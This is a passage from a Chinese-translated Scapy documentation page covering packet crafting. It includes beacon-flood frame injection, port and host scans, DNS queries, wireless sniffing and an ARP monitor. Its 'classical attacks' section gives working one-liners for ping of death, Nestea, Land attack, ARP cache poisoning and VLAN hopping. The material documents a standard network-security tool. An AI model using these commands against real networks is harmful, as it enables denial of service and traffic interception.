<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>res.trace3D()</span><br></pre></td></tr></table></figure>

<p><img src="trace3d_1.png" alt="_images/trace3d_1.png">)<img src="trace3d_2.png" alt="_images/trace3d_2.png"></p>
<h3 id="Wireless-frame-injection"><a href="#Wireless-frame-injection" class="headerlink" title="Wireless frame injection"></a>Wireless frame injection</h3><p>Note</p>
<p>See the TroubleShooting section for more information on the usage of Monitor mode among Scapy.</p>
<p>Provided that your wireless card and driver are correctly configured for frame injection</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ iw dev wlan0 interface add mon0 type monitor</span><br><span class="line">$ ifconfig mon0 up</span><br></pre></td></tr></table></figure>

<p>On Windows, if using Npcap, the equivalent would be to call:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; # Of course, conf.iface can be replaced by any interfaces accessed through IFACES</span><br><span class="line">... conf.iface.setmonitor(True)</span><br></pre></td></tr></table></figure>

<p>you can have a kind of FakeAP:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sendp(RadioTap()&#x2F;</span><br><span class="line">          Dot11(addr1&#x3D;&quot;ff:ff:ff:ff:ff:ff&quot;,</span><br><span class="line">                addr2&#x3D;&quot;00:01:02:03:04:05&quot;,</span><br><span class="line">                addr3&#x3D;&quot;00:01:02:03:04:05&quot;)&#x2F;</span><br><span class="line">          Dot11Beacon(cap&#x3D;&quot;ESS&quot;, timestamp&#x3D;1)&#x2F;</span><br><span class="line">          Dot11Elt(ID&#x3D;&quot;SSID&quot;, info&#x3D;RandString(RandNum(1,50)))&#x2F;</span><br><span class="line">          Dot11EltRates(rates&#x3D;[130, 132, 11, 22])&#x2F;</span><br><span class="line">          Dot11Elt(ID&#x3D;&quot;DSset&quot;, info&#x3D;&quot;\x03&quot;)&#x2F;</span><br><span class="line">          Dot11Elt(ID&#x3D;&quot;TIM&quot;, info&#x3D;&quot;\x00\x01\x00\x00&quot;),</span><br><span class="line">          iface&#x3D;&quot;mon0&quot;, loop&#x3D;1)</span><br></pre></td></tr></table></figure>

<p>Depending on the driver, the commands needed to get a working frame injection interface may vary. You may also have to replace the first pseudo-layer (in the example <code>RadioTap()</code>) by <code>PrismHeader()</code>, or by a proprietary pseudo-layer, or even to remove it.</p>
<h2 id="Simple-one-liners"><a href="#Simple-one-liners" class="headerlink" title="Simple one-liners"></a>Simple one-liners</h2><h3 id="ACK-Scan"><a href="#ACK-Scan" class="headerlink" title="ACK Scan"></a>ACK Scan</h3><p> 使用Scapy强大的数据包功能，我们可以快速地复制经典的TCP扫描。例如，模拟ACK Scan将会发送以下字符串： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans, unans = sr(IP(dst=<span class="string">"www.slashdot.org"</span>)/TCP(dport=[<span class="number">80</span>,<span class="number">666</span>],flags=<span class="string">"A"</span>))</span><br></pre></td></tr></table></figure>

<p> 我们可以在有应答的数据包中发现未过滤的端口： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> s,r <span class="keyword">in</span> ans:</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">if</span> s[TCP].dport == r[TCP].sport:</span><br><span class="line"><span class="meta">... </span>       print(<span class="string">"%d is unfiltered"</span> % s[TCP].dport)</span><br></pre></td></tr></table></figure>

<p> 同样的，可以在无应答的数据包中发现过滤的端口： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> s <span class="keyword">in</span> unans:</span><br><span class="line"><span class="meta">... </span>    print(<span class="string">"%d is filtered"</span> % s[TCP].dport)</span><br></pre></td></tr></table></figure>

<h3 id="Xmas-Scan"><a href="#Xmas-Scan" class="headerlink" title="Xmas Scan"></a>Xmas Scan</h3><p> 可以使用以下的命令来启动Xmas Scan： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans, unans = sr(IP(dst=<span class="string">"192.168.1.1"</span>)/TCP(dport=<span class="number">666</span>,flags=<span class="string">"FPU"</span>) )</span><br></pre></td></tr></table></figure>

<p> 有RST响应则意味着目标主机的对应端口是关闭的。 </p>
<h3 id="IP-Scan"><a href="#IP-Scan" class="headerlink" title="IP Scan"></a>IP Scan</h3><p> 较低级的IP Scan可以用来枚举支持的协议： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans, unans = sr(IP(dst=<span class="string">"192.168.1.1"</span>,proto=(<span class="number">0</span>,<span class="number">255</span>))/<span class="string">"SCAPY"</span>,retry=<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<h3 id="ARP-Ping"><a href="#ARP-Ping" class="headerlink" title="ARP Ping"></a>ARP Ping</h3><p> 在本地以太网络上最快速地发现主机的方法莫过于ARP Ping了： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans, unans = srp(Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>)/ARP(pdst=<span class="string">"192.168.1.0/24"</span>),timeout=<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p> 用以下命令可以来审查应答： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans.summary(<span class="keyword">lambda</span> (s,r): r.sprintf(<span class="string">"%Ether.src% %ARP.psrc%"</span>) )</span><br></pre></td></tr></table></figure>

<p> Scapy还包含内建函数<code>arping()</code>,该函数实现的功能和以上的两个命令类似： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>arping(<span class="string">"192.168.1.*"</span>)</span><br></pre></td></tr></table></figure>

<h3 id="ICMP-Ping"><a href="#ICMP-Ping" class="headerlink" title="ICMP Ping"></a>ICMP Ping</h3><p> 可以用以下的命令来模拟经典的ICMP Ping： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans, unans = sr(IP(dst=<span class="string">"192.168.1.1-254"</span>)/ICMP())</span><br></pre></td></tr></table></figure>

<p> 用以下的命令可以收集存活主机的信息： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans.summary(<span class="keyword">lambda</span> (s,r): r.sprintf(<span class="string">"%IP.src% is alive"</span>) )</span><br></pre></td></tr></table></figure>

<h3 id="TCP-Ping"><a href="#TCP-Ping" class="headerlink" title="TCP Ping"></a>TCP Ping</h3><p> 如果ICMP　echo请求被禁止了，我们依旧可以用不同的TCP Pings，就像下面的TCP SYN Ping: </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans, unans = sr( IP(dst=<span class="string">"192.168.1.*"</span>)/TCP(dport=<span class="number">80</span>,flags=<span class="string">"S"</span>) )</span><br></pre></td></tr></table></figure>

<p> 对我们的刺探有任何响应就意味着为一台存活主机，可以用以下的命令收集结果： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans.summary( <span class="keyword">lambda</span>(s,r) : r.sprintf(<span class="string">"%IP.src% is alive"</span>) )</span><br></pre></td></tr></table></figure>

<h3 id="UDP-Ping"><a href="#UDP-Ping" class="headerlink" title="UDP Ping"></a>UDP Ping</h3><p> 如果其他的都失败了，还可以使用UDP Ping，它可以让存活主机产生ICMP Port unreachable错误。你可以挑选任何极有可能关闭的端口，就像端口0： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans, unans = sr( IP(dst=<span class="string">"192.168.*.1-10"</span>)/UDP(dport=<span class="number">0</span>) )</span><br></pre></td></tr></table></figure>

<p> 同样的，使用以下命令收集结果： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans.summary( <span class="keyword">lambda</span>(s,r) : r.sprintf(<span class="string">"%IP.src% is alive"</span>) )</span><br></pre></td></tr></table></figure>

<h3 id="DNS-Requests"><a href="#DNS-Requests" class="headerlink" title="DNS Requests"></a>DNS Requests</h3><p><strong>IPv4 (A) request:</strong></p>
<p> 这将执行查找IPv4地址的DNS请求 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans = sr1(IP(dst=<span class="string">"8.8.8.8"</span>)/UDP(sport=RandShort(), dport=<span class="number">53</span>)/DNS(rd=<span class="number">1</span>,qd=DNSQR(qname=<span class="string">"secdev.org"</span>,qtype=<span class="string">"A"</span>)))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans.an.rdata</span><br><span class="line"><span class="string">'217.25.178.5'</span></span><br></pre></td></tr></table></figure>

<p><strong>SOA request:</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans = sr1(IP(dst=<span class="string">"8.8.8.8"</span>)/UDP(sport=RandShort(), dport=<span class="number">53</span>)/DNS(rd=<span class="number">1</span>,qd=DNSQR(qname=<span class="string">"secdev.org"</span>,qtype=<span class="string">"SOA"</span>)))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans.ns.mname</span><br><span class="line"><span class="string">b'dns.ovh.net.'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans.ns.rname</span><br><span class="line"><span class="string">b'tech.ovh.net.'</span></span><br></pre></td></tr></table></figure>

<p><strong>MX request:</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans = sr1(IP(dst=<span class="string">"8.8.8.8"</span>)/UDP(sport=RandShort(), dport=<span class="number">53</span>)/DNS(rd=<span class="number">1</span>,qd=DNSQR(qname=<span class="string">"google.com"</span>,qtype=<span class="string">"MX"</span>)))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>results = [x.exchange <span class="keyword">for</span> x <span class="keyword">in</span> ans.an.iterpayloads()]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>results</span><br><span class="line">[<span class="string">b'alt1.aspmx.l.google.com.'</span>,</span><br><span class="line"> <span class="string">b'alt4.aspmx.l.google.com.'</span>,</span><br><span class="line"> <span class="string">b'aspmx.l.google.com.'</span>,</span><br><span class="line"> <span class="string">b'alt2.aspmx.l.google.com.'</span>,</span><br><span class="line"> <span class="string">b'alt3.aspmx.l.google.com.'</span>]</span><br></pre></td></tr></table></figure>

<h3 id="Classical-attacks"><a href="#Classical-attacks" class="headerlink" title="Classical attacks"></a>Classical attacks</h3><p>Malformed packets:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>send(IP(dst=<span class="string">"10.1.1.5"</span>, ihl=<span class="number">2</span>, version=<span class="number">3</span>)/ICMP())</span><br></pre></td></tr></table></figure>

<p>Ping of death (Muuahahah):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>send( fragment(IP(dst=<span class="string">"10.0.0.5"</span>)/ICMP()/(<span class="string">"X"</span>*<span class="number">60000</span>)) )</span><br></pre></td></tr></table></figure>

<p>Nestea attack:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>send(IP(dst=target, id=<span class="number">42</span>, flags=<span class="string">"MF"</span>)/UDP()/(<span class="string">"X"</span>*<span class="number">10</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>send(IP(dst=target, id=<span class="number">42</span>, frag=<span class="number">48</span>)/(<span class="string">"X"</span>*<span class="number">116</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>send(IP(dst=target, id=<span class="number">42</span>, flags=<span class="string">"MF"</span>)/UDP()/(<span class="string">"X"</span>*<span class="number">224</span>))</span><br></pre></td></tr></table></figure>

<p>Land attack (designed for Microsoft Windows):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>send(IP(src=target,dst=target)/TCP(sport=<span class="number">135</span>,dport=<span class="number">135</span>))</span><br></pre></td></tr></table></figure>

<h3 id="ARP-cache-poisoning"><a href="#ARP-cache-poisoning" class="headerlink" title="ARP cache poisoning"></a>ARP cache poisoning</h3><p>这种攻击可以通过VLAN跳跃攻击投毒ARP缓存，使得其他客户端无法加入真正的网关地址。</p>
<p>经典的ARP缓存投毒：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>send( Ether(dst=clientMAC)/ARP(op=<span class="string">"who-has"</span>, psrc=gateway, pdst=client),</span><br><span class="line">      inter=RandNum(<span class="number">10</span>,<span class="number">40</span>), loop=<span class="number">1</span> )</span><br></pre></td></tr></table></figure>

<p> 使用double 802.1q封装进行ARP缓存投毒： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>send( Ether(dst=clientMAC)/Dot1Q(vlan=<span class="number">1</span>)/Dot1Q(vlan=<span class="number">2</span>)</span><br><span class="line">      /ARP(op=<span class="string">"who-has"</span>, psrc=gateway, pdst=client),</span><br><span class="line">      inter=RandNum(<span class="number">10</span>,<span class="number">40</span>), loop=<span class="number">1</span> )</span><br></pre></td></tr></table></figure>

<h3 id="TCP-Port-Scanning"><a href="#TCP-Port-Scanning" class="headerlink" title="TCP Port Scanning"></a>TCP Port Scanning</h3><p> 发送一个TCP SYN到每一个端口上。等待一个SYN-ACK或者是RST或者是一个ICMP错误： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>res, unans = sr( IP(dst=<span class="string">"target"</span>)</span><br><span class="line">                /TCP(flags=<span class="string">"S"</span>, dport=(<span class="number">1</span>,<span class="number">1024</span>)) )</span><br></pre></td></tr></table></figure>

<p> 将开放的端口结果可视化： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>res.nsummary( lfilter=<span class="keyword">lambda</span> (s,r): (r.haslayer(TCP) <span class="keyword">and</span> (r.getlayer(TCP).flags &amp; <span class="number">2</span>)) )</span><br></pre></td></tr></table></figure>

<h3 id="IKE-Scanning"><a href="#IKE-Scanning" class="headerlink" title="IKE Scanning"></a>IKE Scanning</h3><p> 我们试图通过发送ISAKMP Security Association proposals来确定VPN集中器，并接收应答： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>res, unans = sr( IP(dst=<span class="string">"192.168.1.*"</span>)/UDP()</span><br><span class="line">                /ISAKMP(init_cookie=RandString(<span class="number">8</span>), exch_type=<span class="string">"identity prot."</span>)</span><br><span class="line">                /ISAKMP_payload_SA(prop=ISAKMP_payload_Proposal())</span><br><span class="line">              )</span><br></pre></td></tr></table></figure>

<p> 可视化结果列表： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>res.nsummary(prn=<span class="keyword">lambda</span> (s,r): r.src, lfilter=<span class="keyword">lambda</span> (s,r): r.haslayer(ISAKMP) )</span><br></pre></td></tr></table></figure>

<h3 id="Advanced-traceroute"><a href="#Advanced-traceroute" class="headerlink" title="Advanced traceroute"></a>Advanced traceroute</h3><h4 id="TCP-SYN-traceroute"><a href="#TCP-SYN-traceroute" class="headerlink" title="TCP SYN traceroute"></a>TCP SYN traceroute</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans, unans = sr(IP(dst=<span class="string">"4.2.2.1"</span>,ttl=(<span class="number">1</span>,<span class="number">10</span>))/TCP(dport=<span class="number">53</span>,flags=<span class="string">"S"</span>))</span><br></pre></td></tr></table></figure>

<p> 结果会是： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans.summary( <span class="keyword">lambda</span>(s,r) : r.sprintf(<span class="string">"%IP.src%\t&#123;ICMP:%ICMP.type%&#125;\t&#123;TCP:%TCP.flags%&#125;"</span>))</span><br><span class="line"><span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>     time-exceeded</span><br><span class="line"><span class="number">68.86</span><span class="number">.90</span><span class="number">.162</span>    time-exceeded</span><br><span class="line"><span class="number">4.79</span><span class="number">.43</span><span class="number">.134</span>     time-exceeded</span><br><span class="line"><span class="number">4.79</span><span class="number">.43</span><span class="number">.133</span>     time-exceeded</span><br><span class="line"><span class="number">4.68</span><span class="number">.18</span><span class="number">.126</span>     time-exceeded</span><br><span class="line"><span class="number">4.68</span><span class="number">.123</span><span class="number">.38</span>     time-exceeded</span><br><span class="line"><span class="number">4.2</span><span class="number">.2</span><span class="number">.1</span>         SA</span><br></pre></td></tr></table></figure>

<h4 id="UDP-traceroute"><a href="#UDP-traceroute" class="headerlink" title="UDP traceroute"></a>UDP traceroute</h4><p> 相比较TCP来说， traceroute一个UDP应用程序是不可靠的，因为ta没有握手的过程。我们需要给一个应用性的有效载荷（DNS，ISAKMP，NTP等）来得到一个应答： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>res, unans = sr(IP(dst=<span class="string">"target"</span>, ttl=(<span class="number">1</span>,<span class="number">20</span>))</span><br><span class="line">              /UDP()/DNS(qd=DNSQR(qname=<span class="string">"test.com"</span>))</span><br></pre></td></tr></table></figure>

<p> 我们可以想象得到一个路由器列表的结果： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>res.make_table(<span class="keyword">lambda</span> (s,r): (s.dst, s.ttl, r.src))</span><br></pre></td></tr></table></figure>

<h4 id="DNS-traceroute"><a href="#DNS-traceroute" class="headerlink" title="DNS traceroute"></a>DNS traceroute</h4><p> 我们可以在<code>traceroute()</code>函数中设置<code>l4</code>参数为一个完整的数据包，来实现DNS traceroute： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans, unans = traceroute(<span class="string">"4.2.2.1"</span>,l4=UDP(sport=RandShort())/DNS(qd=DNSQR(qname=<span class="string">"thesprawl.org"</span>)))</span><br><span class="line">Begin emission:</span><br><span class="line">..*....******...******.***...****Finished to send <span class="number">30</span> packets.</span><br><span class="line">*****...***...............................</span><br><span class="line">Received <span class="number">75</span> packets, got <span class="number">28</span> answers, remaining <span class="number">2</span> packets</span><br><span class="line">   <span class="number">4.2</span><span class="number">.2</span><span class="number">.1</span>:udp53</span><br><span class="line"><span class="number">1</span>  <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>     <span class="number">11</span></span><br><span class="line"><span class="number">4</span>  <span class="number">68.86</span><span class="number">.90</span><span class="number">.162</span>    <span class="number">11</span></span><br><span class="line"><span class="number">5</span>  <span class="number">4.79</span><span class="number">.43</span><span class="number">.134</span>     <span class="number">11</span></span><br><span class="line"><span class="number">6</span>  <span class="number">4.79</span><span class="number">.43</span><span class="number">.133</span>     <span class="number">11</span></span><br><span class="line"><span class="number">7</span>  <span class="number">4.68</span><span class="number">.18</span><span class="number">.62</span>      <span class="number">11</span></span><br><span class="line"><span class="number">8</span>  <span class="number">4.68</span><span class="number">.123</span><span class="number">.6</span>      <span class="number">11</span></span><br><span class="line"><span class="number">9</span>  <span class="number">4.2</span><span class="number">.2</span><span class="number">.1</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="Etherleaking"><a href="#Etherleaking" class="headerlink" title="Etherleaking"></a>Etherleaking</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sr1(IP(dst=<span class="string">"172.16.1.232"</span>)/ICMP())</span><br><span class="line">&lt;IP src=<span class="number">172.16</span><span class="number">.1</span><span class="number">.232</span> proto=<span class="number">1</span> [...] |&lt;ICMP code=<span class="number">0</span> type=<span class="number">0</span> [...]|</span><br><span class="line">&lt;Padding load=’<span class="number">0</span>O\x02\x01\x00\x04\x06public\xa2B\x02\x02\x1e’ |&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="ICMP-leaking"><a href="#ICMP-leaking" class="headerlink" title="ICMP leaking"></a>ICMP leaking</h3><p>This was a Linux 2.0 bug:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sr1(IP(dst=<span class="string">"172.16.1.1"</span>, options=<span class="string">"\x02"</span>)/ICMP())</span><br><span class="line">&lt;IP src=<span class="number">172.16</span><span class="number">.1</span><span class="number">.1</span> [...] |&lt;ICMP code=<span class="number">0</span> type=<span class="number">12</span> [...] |</span><br><span class="line">&lt;IPerror src=<span class="number">172.16</span><span class="number">.1</span><span class="number">.24</span> options=’\x02\x00\x00\x00’ [...] |</span><br><span class="line">&lt;ICMPerror code=<span class="number">0</span> type=<span class="number">8</span> id=<span class="number">0x0</span> seq=<span class="number">0x0</span> chksum=<span class="number">0xf7ff</span> |</span><br><span class="line">&lt;Padding load=’\x00[...]\x00\x1d.\x00V\x1f\xaf\xd9\xd4;\xca’ |&gt;&gt;&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="VLAN-hopping"><a href="#VLAN-hopping" class="headerlink" title="VLAN hopping"></a>VLAN hopping</h3><p> 在非常特殊的情况下，使用double 802.1q封装，可以将一个数据包跳到另一个VLAN中： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sendp(Ether()/Dot1Q(vlan=<span class="number">2</span>)/Dot1Q(vlan=<span class="number">7</span>)/IP(dst=target)/ICMP())</span><br></pre></td></tr></table></figure>

<h3 id="Wireless-sniffing"><a href="#Wireless-sniffing" class="headerlink" title="Wireless sniffing"></a>Wireless sniffing</h3><p> 以下的命令将会像大多数的无线嗅探器那样显示信息： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sniff(iface=<span class="string">"ath0"</span>, monitor=<span class="literal">True</span>, prn=<span class="keyword">lambda</span> x:x.sprintf(<span class="string">"&#123;Dot11Beacon:%Dot11.addr3%\t%Dot11Beacon.info%\t%PrismHeader.channel%\t%Dot11Beacon.cap%&#125;"</span>))</span><br></pre></td></tr></table></figure>

<p>注意参数 monitor=True , 只用于 scapy&gt;2.4.0 (2.4.0dev+)版本,这是一个跨平台功能. 他基本上都能工作 (在Windows, OSX上), 但可能会要求你手动切换 monitor 模式.</p>
<p> 以上命令会产生类似如下的输出： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">01</span>:<span class="number">02</span>:<span class="number">03</span> netgear      <span class="number">6L</span>   ESS+privacy+PBCC</span><br><span class="line"><span class="number">11</span>:<span class="number">22</span>:<span class="number">33</span>:<span class="number">44</span>:<span class="number">55</span>:<span class="number">66</span> wireless_100 <span class="number">6L</span>   short-slot+ESS+privacy</span><br><span class="line"><span class="number">44</span>:<span class="number">55</span>:<span class="number">66</span>:<span class="number">00</span>:<span class="number">11</span>:<span class="number">22</span> linksys      <span class="number">6L</span>   short-slot+ESS+privacy</span><br><span class="line"><span class="number">12</span>:<span class="number">34</span>:<span class="number">56</span>:<span class="number">78</span>:<span class="number">90</span>:<span class="number">12</span> NETGEAR      <span class="number">6L</span>   short-slot+ESS+privacy+short-preamble</span><br></pre></td></tr></table></figure>

<h2 id="Recipes"><a href="#Recipes" class="headerlink" title="Recipes"></a>Recipes</h2><h3 id="Simplistic-ARP-Monitor"><a href="#Simplistic-ARP-Monitor" class="headerlink" title="Simplistic ARP Monitor"></a>Simplistic ARP Monitor</h3><p> 以下的程序使用了<code>sniff()</code>函数的回调功能（prn参数）。将store参数设置为0，就可以使<code>sniff()</code>函数不存储任何数据（否则会存储），所以就可以一直嗅探下去。filter参数则用于在高负荷的情况下有更好的性能：filter会在内核中应用，而且Scapy就只能嗅探到ARP流量。 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arp_monitor_callback</span><span class="params">(pkt)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> ARP <span class="keyword">in</span> pkt <span class="keyword">and</span> pkt[ARP].op <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">2</span>): <span class="comment">#who-has or is-at</span></span><br><span class="line">        <span class="keyword">return</span> pkt.sprintf(<span class="string">"%ARP.hwsrc% %ARP.psrc%"</span>)</span><br><span class="line"></span><br><span class="line">sniff(prn=arp_monitor_callback, filter=<span class="string">"arp"</span>, store=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Identifying-rogue-DHCP-servers-on-your-LAN"><a href="#Identifying-rogue-DHCP-servers-on-your-LAN" class="headerlink" title="Identifying rogue DHCP servers on your LAN"></a>Identifying rogue DHCP servers on your LAN</h3><h4 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h4><p> 你怀疑有人已经在你的LAN中安装了额外的未经授权的DHCP服务器-无论是故意的还是有意的。因此你想要检查是否有任何活动的DHCP服务器，并确定他们的IP和MAC地址。 </p>
<h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p> 使用Scapy发送一个DHCP发现请求，并分析应答： </p>
